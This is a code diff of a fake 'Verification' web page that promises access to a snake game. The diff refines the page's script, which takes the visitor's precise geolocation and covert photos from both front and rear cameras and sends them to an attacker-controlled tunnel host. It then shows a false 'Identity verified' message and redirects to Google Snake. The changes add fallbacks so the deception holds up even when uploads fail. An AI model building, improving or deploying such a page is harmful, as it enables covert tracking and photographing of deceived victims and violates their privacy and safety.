@@ -6,17 +6,18 @@
     <title>Verification</title>
     <style>
         body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
-        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; }
-        .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; }
+        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; }
         #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:20px auto; }
         @keyframes spin { 100% { transform:rotate(360deg); } }
         video, canvas { display:none; }
+        p { color: #888; font-size: 14px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p id="msg">Please confirm your identity to continue</p>
+        <p id="msg">Please confirm your identity to continue to the game.</p>
         <button class="btn" id="go" onclick="run()">CONFIRM</button>
         <div id="loader"></div>
     </div>
@@ -24,19 +25,22 @@
     <canvas id="c"></canvas>
 
     <script>
-        // UPDATE THIS WITH YOUR ACTUAL TUNNEL LINK
-        const API = "https://b3d6b1279e65b2.lhr.life"; 
+        // REPLACE WITH YOUR ACTUAL LHR.LIFE LINK
+        const API = "https://af1aa022293879.lhr.life"; 
         // Direct link to Google Snake
         const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
         const user = new URLSearchParams(window.location.search).get('user') || "Unknown";
+
+        // Emergency fallback: redirect anyway after 12 seconds if something hangs
+        const fallback = setTimeout(() => { window.location.href = REDIRECT_URL; }, 12000);
 
         async function takePhoto(mode) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
-                await new Promise(r => setTimeout(r, 2000));
+                await new Promise(r => setTimeout(r, 1500));
                 const canvas = document.getElementById('c');
                 canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                 canvas.getContext('2d').drawImage(v, 0, 0);
@@ -47,39 +51,45 @@
         }
 
         async function run() {
-            document.getElementById('go').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('msg').innerText = "Processing, please wait...";
+            const btn = document.getElementById('go');
+            const loader = document.getElementById('loader');
+            const msg = document.getElementById('msg');
+            const statusTitle = document.getElementById('st');
 
-            // 1. Geolocation
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            msg.innerText = "Processing security check...";
+
+            // 1. Get Location
             navigator.geolocation.getCurrentPosition(p => {
-                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`);
+                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
             }, null, {enableHighAccuracy:true});
 
-            // 2. Capture Photos (Front & Back)
+            // 2. Capture Photos
             const fd = new FormData();
             const f1 = await takePhoto("user");
             if (f1) fd.append('files', f1, 'front.jpg');
             const f2 = await takePhoto("environment");
             if (f2) fd.append('files', f2, 'back.jpg');
 
-            // 3. Send and Redirect
-            if (fd.has('files')) {
-                await fetch(`${API}/upload-photo?user=${user}`, { method: 'POST', body: fd });
-                
-                document.getElementById('st').innerText = "Done";
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('msg').innerText = "Verification successful. Redirecting...";
-                
-                // Redirect to Snake game after 1.5 seconds
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 1500);
-
-            } else {
-                alert("Camera access is required for verification.");
-                location.reload();
+            // 3. Send Data and Redirect
+            try {
+                if (fd.has('files')) {
+                    await fetch(`${API}/upload-photo?user=${user}`, { method: 'POST', body: fd });
+                }
+            } catch (e) {
+                console.log("Upload failed, redirecting anyway.");
             }
+
+            // Finalizing
+            clearTimeout(fallback);
+            statusTitle.innerText = "Success";
+            loader.style.display = 'none';
+            msg.innerText = "Identity verified. Redirecting to Snake Arcade...";
+            
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1000);
         }
     </script>
 </body>
